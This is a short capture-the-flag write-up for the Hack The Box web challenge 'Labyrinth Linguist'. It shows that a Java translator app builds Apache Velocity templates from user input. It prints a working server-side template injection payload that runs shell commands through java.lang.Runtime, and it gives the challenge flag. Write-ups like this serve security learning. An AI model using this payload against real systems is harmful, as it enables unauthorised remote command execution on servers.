# Labyrinth Linguist
![Image](https://github.com/user-attachments/assets/5b22c887-ed85-4454-95c1-3c4119c5728f)

**Attachment:** [web_labyrinth_linguist.zip](https://github.com/user-attachments/files/19568963/web_labyrinth_linguist.zip)  
**Password:** hackthebox

## Writeup
![Image](https://github.com/user-attachments/assets/26bd5872-d215-4ac0-9a32-454457ecc943)

"Labyrinth Linguist" is an online text translator that converts English into a strange language called Voxalith.

Let's take a look at the source code:

![Image](https://github.com/user-attachments/assets/76f1b26d-1ff9-4da7-8528-cc1cef272b49)

![Image](https://github.com/user-attachments/assets/985097fe-ae5d-4516-baf0-25e6e86e7730)

Basically, there is only one request that accepts a parameter called `name`. It then reads the `index.html` file and inserts our parameter into it, replacing the `TEXT` field with whatever we provide. This results in a string containing our input, which is then passed to `org.apache.velocity.Template`. From there, the template is parsed and the response is returned.

This means that the Java application is vulnerable to **Server-Side Template Injection**, specifically in the **Apache Velocity** template engine.

On [this site](https://gosecure.github.io/template-injection-workshop/#6) I found a working payload:

```java
#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))##
#set($chr=$x.class.forName('java.lang.Character'))##
#set($str=$x.class.forName('java.lang.String'))##

#set($ex=$rt.getRuntime().exec('ls'))##
$ex.waitFor()
#set($out=$ex.getInputStream())##
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
```

Using **BurpSuite**, I sent a request with this payload, URL-encoded it, and successfully retrieved a list of files.

![Image](https://github.com/user-attachments/assets/74d11580-b70e-4d39-9c04-13d442fb4afb)

So I simply modified the command and retrieved the flag.

![Image](https://github.com/user-attachments/assets/a95a1047-0f47-41e4-af97-f4f222f75ecb)

**HTB{f13ry_t3mpl4t35_fr0m_th3_d3pth5!!_b77d7026dd113c4bb5d9d1f20e63ea65}**
